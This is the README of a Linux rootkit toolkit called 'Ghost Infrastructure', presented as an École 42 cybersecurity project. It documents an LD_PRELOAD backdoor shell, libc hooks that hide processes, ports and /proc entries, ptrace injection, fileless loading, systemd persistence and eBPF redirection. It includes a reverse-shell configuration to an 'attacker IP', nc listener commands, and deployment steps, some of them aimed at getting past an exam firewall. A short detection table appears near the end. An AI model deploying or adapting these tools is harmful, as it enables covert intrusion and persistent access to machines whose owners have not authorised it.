# Ghost Infrastructure — Projet Cybersécurité 42

> **Contexte académique** : Projet de spécialisation cybersécurité (post-tronc commun).  
> Ces outils implémentent des techniques offensives avancées à des fins pédagogiques : persistence, furtivité, injection mémoire, filtrage réseau via eBPF.

---

## Vue d'ensemble de l'architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                     GHOST INFRASTRUCTURE                        │
├─────────────────────────────────────────────────────────────────┤
│  Payload Layer                                                  │
│  ├── encrypt_payload.py (AES-256-GCM)                         │
│  ├── stager.py (fileless decryption + dlopen)                │
│  └── evador.c (memfd-based loader)                            │
├─────────────────────────────────────────────────────────────────┤
│  Injection Layer                                               │
│  ├── ghost_lib.c (light version, target detection)           │
│  ├── hijack.so (full rootkit with hooks)                     │
│  └── injector.c (ptrace-based remote injection)              │
├─────────────────────────────────────────────────────────────────┤
│  Persistence Layer                                             │
│  ├── survival.sh (double-fork daemon)                        │
│  ├── master_deploy.sh (full infrastructure)                   │
│  └── systemd service (user-level persistence)                 │
├─────────────────────────────────────────────────────────────────┤
│  BPF Layer (Advanced)                                          │
│  ├── ghost.bpf.c (sk_lookup redirection)                     │
│  ├── loader.c (BPF loader + FD transfer)                      │
│  └── receiver.c (ghost socket receiver)                       │
└─────────────────────────────────────────────────────────────────┘
```

---

## Fichiers du projet

| Fichier | Type | Rôle |
|---------|------|------|
| `config.h` | Header C | Configuration centralisée (ports, paths, constantes) |
| `ghost_lib.c` | Bibliothèque C | Version légère avec détection de cible |
| `hijack.so` | Bibliothèque C | Full rootkit avec tous les hooks libc |
| `ghost.bpf.c` | eBPF | Redirection de trafic au niveau kernel |
| `loader.c` | C | Chargeur eBPF + transfert de FD via socket Unix |
| `receiver.c` | C | Récepteur du socket fantôme (mode ghost) |
| `evador.c` | C | Chargement .so en mémoire via `memfd_create` |
| `injector.c` | C | Injection ptrace dans processus distant |
| `encrypt_payload.py` | Python | Chiffrement AES-256-GCM du payload |
| `stager.py` | Python | Déchiffrement et exécution fileless en RAM |
| `ghost_deploy.sh` | Bash | Déploiement via injection LD_PRELOAD |
| `ghost_swap.sh` | Bash | Injection chirurgicale sur `gnome-terminal-server` |
| `survival.sh` | Bash | Daemon de survie (double-fork + résistance SIGTERM) |
| `master_deploy.sh` | Bash | Déploiement complet de l'infrastructure |
| `full.sh` | Bash | Script de nettoyage global |

---

## Techniques implémentées

### 1. Backdoor via LD_PRELOAD (`ghost_lib.c`, `hijack.so`)
- Injection d'une shared library dans un processus cible (`gnome-terminal-server`)
- Listener TCP sur le port 9999, spawn d'un shell interactif sur connexion
- Masquage du process via `prctl(PR_SET_NAME, "[kworker/u24:5]")`
- **Kill switch** : détection du fichier `/tmp/.ghost_off` pour auto-extinction
- Détection du processus cible via `/proc/self/exe`

### 2. Rootkit userland (hooks libc dans `hijack.so`)
- Hook `open()` / `openat()` → filtrage `/proc/self/maps` et `/proc/self/environ`
- Hook `readdir()` → masquage du file descriptor du socket
- Hook `recvmsg()` → filtrage des réponses Netlink (`ss` ne voit pas port 9999)
- Hook `bind()` → force `SO_REUSEADDR/SO_REUSEPORT` sur tous les sockets
- Support `openat()` avec chemins relatifs (`openat(proc_fd, "maps")`)
- Garde O_PATH pour éviter comportement indéfini

### 3. Filtrage /proc avancé
- `/proc/self/maps` : masque les lignes contenant `libghost` et `/tmp/*.so`
- `/proc/self/environ` : filtre `LD_PRELOAD=`
- Crée des memfd anonymes via `memfd_create()` (zéro artefact disque)

### 4. Redirection réseau eBPF (`ghost.bpf.c` + `loader.c` + `receiver.c`)
- Programme `sk_lookup` attaché au namespace réseau
- Redirection forcée des paquets port 9999 vers socket fantôme
- Transfert FD via `SCM_RIGHTS` (socket Unix)

### 5. Exécution fileless (`evador.c`, `stager.py`)
- Fichier en RAM via `memfd_create()` (syscall 319)
- Chargement via `/proc/self/fd/<fd>` sans contact disque
- Payload chiffré déchiffré en RAM

### 6. Chiffrement (`encrypt_payload.py`)
- AES-256-GCM via `cryptography.hazmat`
- Nonce 12 octets + auth tag GCM

### 7. Persistance (`survival.sh`, `master_deploy.sh`)
- Double-fork + `setsid()` + ignorance SIGHUP/SIGTERM
- Persistance systemd user via `portal-service.service`
- Workspaces redondants (`/var/tmp`, `/tmp`) avec pièges `-i`

### 8. Injection ptrace (`injector.c`)
- `PTRACE_ATTACH` + attente `SIGTRAP` via breakpoint `int3`
- Lecture résultat `dlopen` depuis RAX
- Sauvegarde/restauration registres et mémoire

---

## Configuration centralisée (`config.h`)

```c
#define GHOST_PORT          443
#define SURVIVAL_PORT       8443
#define KILL_SWITCH         "/tmp/.ghost_off"
#define FAKE_THREAD_NAME    "[kworker/u24:5]"
#define UNIX_BRIDGE        "ghost_bridge"
#define BPF_OBJ_PATH        "ghost.bpf.o"
#define GHOST_SO_NAME       "libghost"

#define TARGET_COMM_1       "gnome-terminal"
#define TARGET_COMM_2       "zsh"

/* Reverse shell configuration */
#define GHOST_REVERSE_MODE   0       // 1 = enable reverse shell
#define GHOST_REVERSE_HOST   "10.51.1.6"  // Attacker IP
#define GHOST_REVERSE_PORT  4444     // Attacker port
#define GHOST_RETRY_DELAY   5        // Seconds between retries
```

> **Note exam** : Port 443 (HTTPS) et 8443 pour éviter le firewall. Se connecter depuis un réseau staff (10.42.x.x, 10.43.x.x, 10.0.8.x).

---

## Compilation

```bash
# Build complet
make all

# Build individuel
make hijack.so          # Full rootkit
make ghost_lib.so       # Version légère
make evador             # Loader fileless
make injector           # Injection ptrace
make receiver           # Récepteur BPF
make ghost.bpf.o        # Programme eBPF (requiert clang)
make loader             # Loader BPF (requiert libbpf)

# Setup libbpf (une fois)
make setup-libbpf

# Nettoyage
make clean
```

---

## Utilisation

### Déploiement standard

```bash
# Déploiement minimal (LD_PRELOAD uniquement)
./ghost_deploy.sh start
./ghost_swap.sh

# Vérification
./ghost_deploy.sh check

# Nettoyage minimal
./ghost_deploy.sh stop
```

### Persistence avancées

```bash
# Survie au logout (double-fork daemon)
./survival.sh start
./survival.sh stop

# Déploiement complet infrastructure
./master_deploy.sh

# Nettoyage total
./full.sh
touch /tmp/.ghost_off   # Kill switch
```

### Injection ptrace

```bash
# Compilation (si make non utilisé)
gcc -Wall -Wextra -o injector injector.c -ldl

# Injection dans processus distant
# Nécessite CAP_SYS_PTRACE ou root
./injector <pid> /chemin/vers/lib.so

# Exemple
./injector $(pgrep -f gnome-terminal) /tmp/libghost.so
```

### Connexion backdoor

```bash
# Shell interactif
nc localhost 9999

# Port secondaire (daemon survie)
nc localhost 8888
```

### Reverse Shell (bypass firewall)

Pour contourner le firewall exam, utiliser le mode reverse shell :

```c
// Dans config.h
#define GHOST_REVERSE_MODE   1
#define GHOST_REVERSE_HOST   "10.51.1.6"  // IP autorisée par le firewall
#define GHOST_REVERSE_PORT  4444
```

**Sur la machine autorisée (C2)** :
```bash
# Écouter les connexions
nc -lvp 4444
```

**Usage** :
1. Modifier config.h pour activer `GHOST_REVERSE_MODE = 1`
2. Mettre une IP autorisée dans `GHOST_REVERSE_HOST` (ex: 10.51.1.6)
3. Compiler hijack.so
4. Déployer sur la cible
5. La cible se connecte automatiquement à l'IP autorisée:4444

### Payload fileless

```bash
# Chiffrement
pip install cryptography
python3 encrypt_payload.py hijack.so

# Exécution fileless
python3 stager.py -p hijack.so.enc -k <cle_hex_a_32_caracteres>
```

---

## Explication Complète du Projet

### Qu'est-ce que Ghost Infrastructure ?

C'est un **projet académique de cybersécurité** (École 42) qui implémente des techniques offensives avancées :
- **Rootkit userland** : intercepte les appels système pour cacher un processus
- **Backdoor réseau** : ouvre un shell distant sur un port secret
- **Reverse shell** : se connecte à un serveur C2 distant (bypass firewall)
- **Injection mémoire** : charge du code dans un processus distant sans toucher le disque
- **Fileless execution** : tout reste en RAM, zero trace sur le disque

**Contexte** : C'est un projet pédagogique pour comprendre comment fonctionnent les malwares et rootkits réels, afin de mieux les détecter et s'en defender.

---

### Architecture en couches

```
┌─────────────────────────────────────────────────────────────┐
│                    GHOST INFRASTRUCTURE                     │
├─────────────────────────────────────────────────────────────┤
│  Couche 1: PAYLOAD                                          │
│  → Code malveillant à exécuter (ici: hijack.so)            │
│  → Chiffré avec AES-256-GCM pour evade detection           │
├─────────────────────────────────────────────────────────────┤
│  Couche 2: DELIVERY                                         │
│  → Comment deliver le payload sur la cible                  │
│  → LD_PRELOAD, ptrace injection, ou fileless memfd         │
├─────────────────────────────────────────────────────────────┤
│  Couche 3: PERSISTANCE                                      │
│  → Comment survivre au reboot/logout                        │
│  → Double-fork, systemd, multiples backup locations         │
├─────────────────────────────────────────────────────────────┤
│  Couche 4: EVASION                                          │
│  → Comment éviter la détection                               │
│  → Filtrage /proc, masquer FD, masquer ports réseau          │
└─────────────────────────────────────────────────────────────┘
```

---

### Cas d'utilisation concrets

#### Scénario 1 : Compromission de terminal GNOME

**Situation** : Vous avez un accès sur une machine Linux avec GNOME. Vous voulez maintenir un accès discret.

**Étapes** :
```bash
# 1. Injection via LD_PRELOAD sur gnome-terminal-server
export LD_PRELOAD=/path/to/hijack.so

# 2. La backdoor écoute sur port 9999
# 3. Connection depuis l'extérieur
nc <target_ip> 9999
# → obtain interactive shell
```

**Ce qui se passe** :
1. Quand gnome-terminal-server démarre avec `LD_PRELOAD`, la lib `hijack.so` est chargée
2. La lib spawn un thread listener sur port 9999
3. Ce thread se fait passer pour un worker kernel (`[kworker/u24:5]`)
4. Quand vous vous connectez, vous avez un shell root

**Détection évitée** :
- `/proc/<pid>/maps` ne montre pas `libghost` (filtré)
- `/proc/<pid>/environ` ne montre pas `LD_PRELOAD` (filtré)
- `ss` ne montre pas le port 9999 (filtre Netlink)
- `ls /proc/self/fd/` ne montre pas le socket (hide via readdir)

---

#### Scénario 2 : Injection à distance via ptrace

**Situation** : Vous avez un UID sur la machine cible mais pas de LD_PRELOAD. Vous voulez injecter votre .so dans un processus existant.

```bash
# Sur attacker
gcc injector.c -o injector
./injector <target_pid> /tmp/libghost.so
```

**Ce qui se passe** :
1. `injector` fait `PTRACE_ATTACH` sur le processus cible
2. Il lit `/proc/<pid>/maps` pour trouver libc distante
3. Il calcule l'adresse de `dlopen` (même offset que sur machine locale)
4. Il écrit le chemin `.so` dans la mémoire de la cible
5. Il place un breakpoint `int3` après l'appel `dlopen`
6. Il ajuste RIP pour exécuter `dlopen(path, RTLD_LAZY)`
7. Il attend le SIGTRAP, lit le résultat dans RAX
8. Il restaure tout et se détache

**Résultat** : Le processus distant charge `libghost.so` comme si c'était son propre code.

---

#### Scénario 3 : Exécution fileless (zéro artefact)

**Situation** : Vous voulez exécuter votre payload sans créer de fichier sur le disque (évite forensic).

```bash
# Chiffrement
python3 encrypt_payload.py hijack.so
# → hijack.so.enc

# Exécution sur cible
python3 stager.py -p hijack.so.enc -k <32_char_hex_key>
```

**Ce qui se passe** :
1. `stager.py` déchiffre le payload en RAM
2. Il crée un memfd (`memfd_create()`) — c'est un fichier en RAM, pas sur disque
3. Il écrit le .so déchiffré dans ce memfd
4. Il fait `dlopen("/proc/self/fd/<memfd>")`
5. Le .so est chargé sans jamais avoir touché le disque

**Avantage** : Aucun fichier dans `/tmp`, `/var/tmp`, `/home/...`. Le disque ne montre rien d'anormal.

---

#### Scénario 4 : Persistence survive au reboot

**Situation** : Vous voulez que la backdoor revienne après un reboot ou logout.

```bash
./survival.sh start
```

**Ce qui se passe** :
1. Le script fait un **double-fork** pour créer un processus orphelin
2. Il appelle `setsid()` pour se détacher du terminal
3. Il ignore `SIGHUP` (survit au logout) et `SIGTERM`
4. Il lance un service systemd user (`portal-service.service`)
5. Il utilise `loginctl enable-linger` pour démarrer au boot

**Résultat** : Même si l'utilisateur se déconnecte ou que la machine reboote, la backdoor revient.

---

#### Scénario 5 : Redirection réseau eBPF (avancé)

**Situation** : Vous voulez intercepter le trafic réseau au niveau kernel (plus furtif que les hooks userland).

```bash
# Compile le programme eBPF
clang -O2 -target bpf -c ghost.bpf.c -o ghost.bpf.o

# Loader
./loader
```

**Ce qui se passe** :
1. Le programme eBPF `sk_lookup` est attaché au namespace réseau
2. Quand un paquet arrive sur port 9999, il est redirigé vers un "ghost socket"
3. Le FD du socket est transmis au receiver via `SCM_RIGHTS` (socket Unix)
4. Le receiver a maintenant accès au trafic avant même qu'il n'atteigne l'userland

**Avantage** : Presque impossible à détecter userland — le traffic est intercepté AVANT les hooks normaux.

---

### Techniques clés expliquées

#### 1. Hook libc via LD_PRELOAD

```c
// On intercepte open()
int open(const char *path, int flags, ...) {
    if (is_ghost_path(path)) {
        return filtered_fd;  // retourne un memfd nettoyé
    }
    return real_open(path, flags);  // appelle la vraie fonction
}
```

**Pourquoi ça marche** : `LD_PRELOAD` charge notre lib AVANT les autres, donc nos fonctions sont appelées en premier.

#### 2. Filtrage /proc

```c
// Avant de retourner /proc/self/maps, on filtre
while (fgets(line, ...)) {
    if (strstr(line, "libghost") || strstr(line, "/tmp/") && strstr(line, ".so")) {
        continue;  // skip cette ligne
    }
    memcpy(filtered + pos, line, len);
}
```

**Pourquoi ça marche** : Les outils comme `ps`, `cat /proc/self/maps` ne voient pas les preuves de l'infection.

#### 3. Résolution d'adresse distante (ASLR)

```c
// Local : lire /proc/self/maps, trouver libc, calculer offset
local_libc = 0x7f0000000000
local_dlopen = 0x7f0001234000
offset = local_dlopen - local_libc  // = 0x1234000

// Distant : lire /proc/<pid>/maps, ajouter offset
remote_libc = 0x7f2000000000
remote_dlopen = remote_libc + offset  // = 0x7f21234000
```

**Pourquoi ça marche** : ASLR randomise les adresses mais l'*offset* entre deux fonctions dans la même libc est constant.

---

### Pour la détection (Blue Team)

Maintenant que vous comprenez les techniques, voici comment les détecter :

| Technique | Indicator of Compromise (IoC) |
|-----------|------------------------------|
| LD_PRELOAD | `ldd /proc/<pid>/exe` montre des libs inattues |
| Hooks libc | Appels système incohérents (open returns memfd) |
| memfd_create | syscall 319 visible dans strace |
| eBPF sk_lookup | `bpftool net show` |
| Thread kernel fake | `/proc/<pid>/status` → Name différent de exe |
| Port caché | Connection active sur port non-listé (`ss -tunap`) |
| Double-fork | Processus orphan avec ppid=1 |

---

## Corrections de sécurité (v5.2)

| Problème | Fichier | Correction |
|----------|---------|------------|
| Race condition post-unlock | `ghost_lib.c`, `hijack.c` | Pattern mutex→memfd→unlock→retour FD |
| Buffer overflow boucle copie | `ghost_lib.c`, `hijack.c` | Vérification `(dst-filtered)` dans boucle interne |
| usleep non déterministe | `injector.c` | Attente SIGTRAP via breakpoint int3 |
| Bypass openat chemin relatif | `ghost_lib.c`, `hijack.c` | Détection dirfd→/proc/<pid>/ via readlink |
| O_PATH non géré | `ghost_lib.c`, `hijack.c` | Garde early-return pour O_PATH |
| Fuite FD sur erreur | `ghost_lib.c`, `hijack.c` | Fermeture systématique dans create_filtered_memfd |
| Contention mutex | `ghost_lib.c`, `hijack.c` | Mutex séparés environ/maps |

---

## Prérequis

- Linux x86_64 (kernel ≥ 5.9 pour eBPF sk_lookup)
- `gcc`, `clang`, `libbpf`, `libelf`, `zlib`, `make`
- Python 3 + `cryptography` (`pip install cryptography`)
- `CAP_NET_ADMIN` pour eBPF
- `CAP_SYS_PTRACE` pour injection distante
- Environnement GNOME (cible `gnome-terminal-server`)

---

## Fonctionnement interne

### Hooks libc (`hijack.so`)

```
open("/proc/self/maps") → filter_maps_create_fd() → memfd_create() → return fd
open("/proc/self/environ") → filter_environ_create_fd() → memfd_create() → return fd
readdir() → skip entry if d_name == ghost_fd
recvmsg() → skip netlink if sport == 9999
bind() → setsockopt(SO_REUSEADDR|SO_REUSEPORT)
```

### Filtrage /proc avec mutex

```c
// Pattern sécurisé v5.2
pthread_mutex_lock(&maps_mutex);
// ... lecture /proc et filtrage ...
int fd = create_filtered_memfd(filtered, total);  // memfd SOUS mutex
pthread_mutex_unlock(&maps_mutex);
return fd;  // Retour FD, pas de pointeur buffer
```

### Injection ptrace

```
1. PTRACE_ATTACH → waitpid(WIFSTOPPED)
2. GETREGS → sauvegarde
3. POKEDATA chemin → inject_path()
4. POKETEXT int3 breakpoint → breakpoint地址
5. SETREGS (RIP=dlopen, RDI=chemin, RSI=RTLD_LAZY)
6. CONT → attend SIGTRAP
7. waitpid() → lit RAX pour résultat dlopen
8. POKETEXT restaure octet original
9. SETREGS restauration + DETACH
```

---

## Avertissement

> Ces outils sont développés dans un cadre strictement académique (École 42 — spécialisation cybersécurité).  
> Leur utilisation en dehors d'un environnement de lab isolé ou sans autorisation explicite est illégale.

---

## Glossaire

| Terme | Définition |
|-------|------------|
| LD_PRELOAD | Mécanisme Linux pour intercepter appels libc |
| memfd | File descriptor en RAM (pas de fichier disque) |
| SCM_RIGHTS | Passage de file descriptors via socket Unix |
| sk_lookup | Hook eBPF pour interception trafic réseau |
| ASLR | Randomisation des adresses mémoire |
| RTLD_NEXT | Symbole "suivant" dans ordre libraries |
